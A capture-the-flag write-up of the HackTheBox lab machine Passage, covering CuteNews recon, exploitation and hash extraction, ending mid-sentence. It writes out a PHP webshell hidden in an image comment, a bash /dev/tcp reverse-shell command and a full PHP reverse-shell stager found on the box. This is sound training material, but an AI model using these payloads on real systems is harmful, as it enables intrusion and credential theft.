---
title: HTB: Passage
url: https://0xdf.gitlab.io/2021/03/06/htb-passage.html
date: 2021-03-06T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-passage, ctf, hackthebox, nmap, cutenews, webshell, upload, searchsploit, github, source-code, base64, penglab, hashcat, vim, usbcreator, arbitrary-write, file-read, cyberchef, passwd, oscp-like-v2
---

![Passage](https://0xdfimages.gitlab.io/img/passage-cover.png)

In Passage, I’ll find and exploit CuteNews with a webshell upload. I’ll have to analyze the CuteNews source to figure out how it stores user data in files to find the hash for the next user, which I’ll crack. That user shares an SSH key with the next user on the box. To root, I’ll exploit a bug in USBCreator that allows me to run sudo without knowing the user’s password. In Beyond Root, I’ll dive into the basics of base64 and how to search for strings in large amounts of base64 data.

## Box Info

| Name | [Passage](https://hackthebox.com/machines/passage)  [Passage](https://hackthebox.com/machines/passage) [Play on HackTheBox](https://hackthebox.com/machines/passage) |
| --- | --- |
| Release Date | [05 Sep 2020](https://twitter.com/hackthebox_eu/status/1301546185552003073) |
| Retire Date | 06 Mar 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Passage |
| Radar Graph | Radar chart for Passage |
| First Blood User | 00:19:35[qtc qtc](https://app.hackthebox.com/users/103578) |
| First Blood Root | 00:32:04[Lemming Lemming](https://app.hackthebox.com/users/11933) |
| Creator | [ChefByzen ChefByzen](https://app.hackthebox.com/users/140851) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.206
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 15:03 EDT
Nmap scan report for 10.10.10.206
Host is up (0.019s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.79 seconds
root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.206
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 15:04 EDT
Nmap scan report for 10.10.10.206
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 16.04 Xenial.

### Website - TCP 80

#### Site

The site is a list of blog posts, but all but the most recent one are just [Lorem Ipsum text](https://loremipsum.io/):

[![image-20200908152147940](https://0xdfimages.gitlab.io/img/image-20200908152147940.png)](https://0xdfimages.gitlab.io/img/image-20200908152147940.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200908152147940.png)

The top post talks about how they’ve implemented Fail2Ban, which is a good hint to not brute force anything, so I’ll skip `gobuster` here:

> Due to unusually large amounts of traffic, we have implemented Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection.

There are five users on the site:
- admin - nadav@passage.htb
- Paul Coles - paul@passage.htb
- Kim Swift - kim@example.com
- Sid Meier - sid@example.com
- James - james@example.com

I’ll add `passage.htb` to `/etc/hosts`.

#### RSS

The RSS link on the right side leads to `http://10.10.10.206/CuteNews/rss.php`, which returns the XML RSS feed:

![image-20200908153450899](https://0xdfimages.gitlab.io/img/image-20200908153450899.png)

Removing `rss.php` from the URL leads to the login page:

![image-20200908154156274](https://0xdfimages.gitlab.io/img/image-20200908154156274.png)

It also presents a version for CuteNews - 2.1.2.

The Register button is live, and leads to a form to create an account:

![image-20200908154321702](https://0xdfimages.gitlab.io/img/image-20200908154321702.png)

I can create an account and it takes me to the profile page:

![image-20200908154516347](https://0xdfimages.gitlab.io/img/image-20200908154516347.png)

## Shell as www-data

### CuteNews Exploits

Running `searchsploit cutenews` returns a ton, so I re-searched limiting it to the known version:

```

root@kali# searchsploit cutenews 2.1
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)          | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                              | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                  | php/webapps/48458.txt
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

I don’t really care about file deletion. It looks like the first and third one are the similar.

Opening the MSF exploit with `searchsploit -x php/remote/46698.rb`, the description reads:

> This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
> The attacker can infiltrate the server through the avatar upload process in the profile area.
> There is no realistic control of the $imgsize function in “/core/modules/dashboard.php”
> Header content of the file can be changed and the control can be bypassed.
> We can use the “GIF” header for this process.
> An ordinary user is enough to exploit the vulnerability. No need for admin user.
> The module creates a file for you and allows RCE.

Scrolling through the code, there are a couple functions that jump out. `exec`:

```

  def exec
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "uploads","avatar_#{datastore['USERNAME']}_#{@shell}") # shell url
    })
  end

```

And `upload_shell`:

```

  def upload_shell(cookie, check)

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "index.php?mod=main&opt=personal"),
      'cookie'   => cookie
    })

    signkey = res.body.split('__signature_key" value="')[1].split('"')[0]
    signdsi = res.body.split('__signature_dsi" value="')[1].split('"')[0]
    # data preparation
    fname = Rex::Text.rand_text_alpha_lower(8) + ".php"
    @shell = "#{fname}"
    pdata = Rex::MIME::Message.new
    pdata.add_part('main', nil, nil, 'form-data; name="mod"')
...[snip]...

```

The url for `upload_shell` is `/CuteNews/index.php?mod=main&opt=personal`. It looks like it’s just uploading a new Avatar with a `.php` extension and a webshell in it. Then `exec` triggers that by visiting the avatar URL.

### Upload Webshell

Visiting `index.php?mod=main&opt=personal`, it gives a page for changing personal options:

![image-20200908160214000](https://0xdfimages.gitlab.io/img/image-20200908160214000.png)

Towards the bottom there’s an avatar upload. If I try to upload PHP code like a simple webshell named `cmd.php`, the site throws an error right away, without sending any request to Passage. This is local JavaScript validation of the filename.

If I just upload an actual image, it works:

![image-20200908160440507](https://0xdfimages.gitlab.io/img/image-20200908160440507.png)

I’ll add a webshell as a comment to that file using `exiftool`:

```

root@kali:/opt/shells/php# exiftool -Comment='<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>' avatar.png 
    1 image files updated

```

I’ll upload that modified file, still with a `.png` extension, but this time with Burp proxy intercepting. Once it intercepts the request, I’ll change the filename from `avatar.png` to `avatar.php`:

[![image-20200908160843299](https://0xdfimages.gitlab.io/img/image-20200908160843299.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200908160843299.png)

I’ll forward that packet and turn intercept back off, and the upload seems to work. Client-side validation is a nice user experience enhancement, but it isn’t a security mechanism.

The avatar is now broken:

![image-20200908160920455](https://0xdfimages.gitlab.io/img/image-20200908160920455.png)

If I right click and select “View Image”, the full url is: `http://passage.htb/CuteNews/uploads/avatar_0xdf_avatar.php` (which matches the url from the Metasploit exploit). I can visit that url with `?cmd=id` on the end, and the server processes the image as PHP, running the comment:

![image-20200908161034845](https://0xdfimages.gitlab.io/img/image-20200908161034845.png)

### Shell

Now to get a real shell, I’ll visit: `http://passage.htb/CuteNews/uploads/avatar_0xdf_avatar.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'`. The shell returns at a `nc` listener:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.206.
Ncat: Connection from 10.10.10.206:43666.
bash: cannot set terminal process group (1682): Inappropriate ioctl for device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ 

```

## Shell as paul

### Enumeration in /uploads

Right away I notice that there’s two other uploads in the directory with mine:

```

www-data@passage:/var/www/html/CuteNews/uploads$ ls -l 
total 20
-rw-r--r-- 1 www-data www-data 12076 Sep  8 13:11 avatar_0xdf_avatar.php
-rw-r--r-- 1 www-data www-data  1115 Aug 31 13:48 avatar_egre55_ykxnacpt.php
-rw-r--r-- 1 www-data www-data  1116 Aug 31 14:55 avatar_hacker_jpyoyskt.php

```

The dates are old, so they must be a part of the box image. Beyond that, both are PHP files, not images, and both are reverse shells. For example, `avatar_egre55_ykxnacpt.php`:

```

/*<?php /**/ error_reporting(0); $ip = '10.10.14.6'; $port = 443; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();

```

So these two users of CuteNews also tried to hack the site? Or these could just be testing artifacts. I’ll look more into these users.

### Storage - Not a DB

I wanted to look more at the database, but looking at the [GitHub for Cute News](https://github.com/CuteNews/cutenews-2.0), on the front page one of the selling points is:

![image-20200908180155278](https://0xdfimages.gitlab.io/img/image-20200908180155278.png)

To figure out how CuteNews stores user data, I’ll start with the POST request to register:

```

POST /CuteNews/index.php?register HTTP/1.1
Host: 10.10.10.206
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.206/CuteNews/index.php?register
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Connection: close
Cookie: CUTENEWS_SESSION=620744kp29jripj8k27cqj3gt2
Upgrade-Insecure-Requests: 1

action=register&regusername=0xdf&regnickname=0xdf&regpassword=qwerasdf&confirm=qwerasdf&regemail=0xdf%40aol.com

```

I figured I should be able to find where that is handled, and then see what gets stored. As that POST goes to `index.php`, I started [there](https://github.com/CuteNews/cutenews-2.0/blob/master/index.php). It’s super short:

```

<?php

/***************************************************************************
 * @Developer CuteNews CutePHP.com
 * @Copyrights Copyright (с)  2012-2013 Cutenews Team
 * @Type Bootstrap
 ***************************************************************************/

define('AREA', "ADMIN");
include dirname(__FILE__).'/core/init.php';

cn_sendheaders();
cn_load_skin();
cn_register_form();

if (cn_login()) {
    hook('index/invoke_module', array($_module) );
} else {
    cn_login_form();
}

```

Seems like I need to find `cn_registry_form()`. To pivot through the source on GitHub I’ll use the search box at the top left of the page:

![image-20200908180423680](https://0xdfimages.gitlab.io/img/image-20200908180423680.png)

Searching for `cn_registry_form` yielded two results:

![image-20200908180816071](https://0xdfimages.gitlab.io/img/image-20200908180816071.png)

The second one is where the function is defined. After Ctrl-f and a bit of scrolling around, I found this at [line 3432](https://github.com/CuteNews/cutenews-2.0/blob/d5dd74227b888644a72799641ce35b2e711e276f/core/core.php#L3432):

```

db_user_add($regusername, $acl_groupid_default);
db_user_update($regusername, "email=$regemail", "name=$regusername", "nick=$regnickname", "pass=$pass", "acl=$acl_groupid_default");

```

Both of those seem to interact with the “DB”, but the second has a bunch of information to store, so I’ll go with that. Back to the search bar with “db\_user\_update”, which looks to be defined in `core/db/coreflat.php` at [line 229](https://github.com/CuteNews/cutenews-2.0/blob/d5dd74227b888644a72799641ce35b2e711e276f/core/db/coreflat.php#L229):

![image-20200908181026510](https://0xdfimages.gitlab.io/img/image-20200908181026510.png)

[38 lines later](https://github.com/CuteNews/cutenews-2.0/blob/d5dd74227b888644a72799641ce35b2e711e276f/core/db/coreflat.php#L267):

```

// Save DB
cn_fsave($fn, $cu);

```

I can guess that function is saving the data to the file `$fn` (likely file name). At line [241](https://github.com/CuteNews/cutenews-2.0/blob/d5dd74227b888644a72799641ce35b2e711e276f/core/db/coreflat.php#L241) it sets `$fn`:

```

$fn =SERVDIR. path_construct( 'cdata','users',substr(md5($username), 0, 2).'.php');

```

So the users data is stored in `/cdata/users/[first two characters of the md5 of the username].php`.

### Files

Back on Passage, that directory contains quite a few users:

```

www-data@passage:/var/www/html/CuteNews/cdata/users$ ls
09.php  16.php  32.php  52.php  66.php  77.php  8f.php  b0.php  c9.php  d5.php  fc.php  users.txt
0a.php  21.php  46.php  5d.php  6e.php  7a.php  97.php  c8.php  d4.php  d6.php  lines

```

My user should be stored in `46.php`:

```

root@kali# echo -n 0xdf | md5sum
465e929fc1e0853025faad58fc8cb47d  -

```

That file contains some PHP that will prevent the data after it from printing, and then a single base64-encoded line:

```

www-data@passage:/var/www/html/CuteNews/cdata/users$ cat 46.php 
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo0OiIweGRmIjthOjk6e3M6MjoiaWQiO3M6MTA6IjE1OTk1OTQ1MTgiO3M6NDoibmFtZSI7czo0OiIweGRmIjtzOjM6ImFjbCI7czoxOiI0IjtzOjU6ImVtYWlsIjtzOjEzOiIweGRmQDB4ZGYuY29tIjtzOjQ6Im5pY2siO3M6NDoiMHhkZiI7czo0OiJwYXNzIjtzOjY0OiJmM2I5ZjU4NTE4ZjJiMjEyNDY3YThhYjUxNzRmMTMyNGQ4Y2JkZmNiYjkwMjhiMTYzNjA1MTA1Zjg1OTc5MTQ2IjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czo2OiJhdmF0YXIiO3M6MjI6ImF2YXRhcl8weGRmX2F2YXRhci5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19

```

When I decode it, this looks like serialized PHP data:

```

root@kali# echo "YToxOntzOjQ6Im5hbWUiO2E6MTp7czo0OiIweGRmIjthOjk6e3M6MjoiaWQiO3M6MTA6IjE1OTk1OTQ1MTgiO3M6NDoibmFtZSI7czo0OiIweGRmIjtzOjM6ImFjbCI7czoxOiI0IjtzOjU6ImVtYWlsIjtzOjEzOiIweGRmQDB4ZGYuY29tIjtzOjQ6Im5pY2siO3M6NDoiMHhkZiI7czo0OiJwYXNzIjtzOjY0OiJmM2I5ZjU4NTE4ZjJiMjEyNDY3YThhYjUxNzRmMTMyNGQ4Y2JkZmNiYjkwMjhiMTYzNjA1MTA1Zjg1OTc5MTQ2IjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czo2OiJhdmF0YXIiO3M6MjI6ImF2YXRhcl8weGRmX2F2YXRhci5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19" | base64 -d
a:1:{s:4:"name";a:1:{s:4:"0xdf";a:9:{s:2:"id";s:10:"1599594518";s:4:"name";s:4:"0xdf";s:3:"acl";s:1:"4";s:5:"email";s:13:"0xdf@0xdf.com";s:4:"nick";s:4:"0xdf";s:4:"pass";s:64:"f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:22:"avatar_0xdf_avatar.php";s:6:"e-hide";s:0:"";}}}

```

I’m immediately drawn to the `pass` field, which is 64 bytes long:

```

s:4:"pass";s:64:"f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146";

```

That’s likely a SHA-256 hash. I can test with the password I set, and it matches:

```

root@kali# echo -n "0xdf" | sha256sum 
f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146  -

```

### Find Hashes

#### Pull From Files

There’s not that many files in this directory. I’ll just `cat` each file, removing any lines with `php die` and empty lines (`grep .`), and then read the lines one at a time, base64-decoding them, and adding a newline for readability:

```

www-data@passage:/var/www/html/CuteNews/cdata/users$ for f in *; do cat $f | grep -v 'php die'; echo; done | grep . | while read line; do echo $line | base64 -d; echo; done 
a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}
a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}
a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}
a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:2:"id";a:1:{i:1598910896;s:6:"hacker";}}
a:1:{s:4:"name";a:1:{s:4:"0xdf";a:9:{s:2:"id";s:10:"1599594518";s:4:"name";s:4:"0xdf";s:3:"acl";s:1:"4";s:5:"email";s:13:"0xdf@0xdf.com";s:4:"nick";s:4:"0xdf";s:4:"pass";s:64:"f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:22:"avatar_0xdf_avatar.php";s:6:"e-hide";s:0:"";}}}
...[snip]...

```

I can do even better and then `grep` for `pass` to just get the lines with a password (as there are a bunch of entries that don’t contain it):

```

www-data@passage:/var/www/html/CuteNews/cdata/users$ for f in *; do cat $f | grep -v 'php die'; echo; done | grep . | while read line; do echo $line | base64 -d; echo; done | grep '"pass"'            
a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:4:"name";a:1:{s:4:"0xdf";a:9:{s:2:"id";s:10:"1599594518";s:4:"name";s:4:"0xdf";s:3:"acl";s:1:"4";s:5:"email";s:13:"0xdf@0xdf.com";s:4:"nick";s:4:"0xdf";s:4:"pass";s:64:"f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:22:"avatar_0xdf_avatar.php";s:6:"e-hide";s:0:"";}}}
a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}
a:1:{s:4:"name";a:2:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598906881";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_ykxnacpt.php";s:6:"e-hide";s:0:"";}s:6:"hacker";a:11:{s:2:"id";s:10:"1598910896";s:4:"name";s:6:"hacker";s:3:"acl";s:1:"4";s:5:"email";s:20:"hacker@hacker.hacker";s:4:"nick";s:6:"hacker";s:4:"pass";s:64:"e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9";s:3:"lts";s:10:"1599600451";s:3:"ban";s:1:"0";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:26:"avatar_hacker_jpyoyskt.php";s:6:"e-hide";s:0:"";}}}
a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}
a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}

```

These are PHP serialized objects, so I could read it in with PHP, but some manual cleanup with `vim` or `grep` will also do it (I’ll show a one-liner in the next section):

```

nadav:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e
0xdf:f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146
sid-meier:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
paul-coles:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
kim-swift:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
egre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
hacker:e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9

```

This reminded me of searching for things in base64-encoded data, and while it wasn’t at all necessary here, I’ll play with that in [Beyond Root](#beyond-root---searching-in-base64).

#### Shortcut

In the `users` folder there’s also a file called `lines`, which seems to be all of the other files combined together. I can pull the hashes out of it:

```

www-data@passage:/var/www/html/CuteNews/cdata/users$ cat lines | grep -v "php die" | while read line; do echo $line | base64 -d; done
a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}a:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}a:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}a:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}

```

But dangerously, Ippsec pointed out to me that file is available from the internet over the webserver:

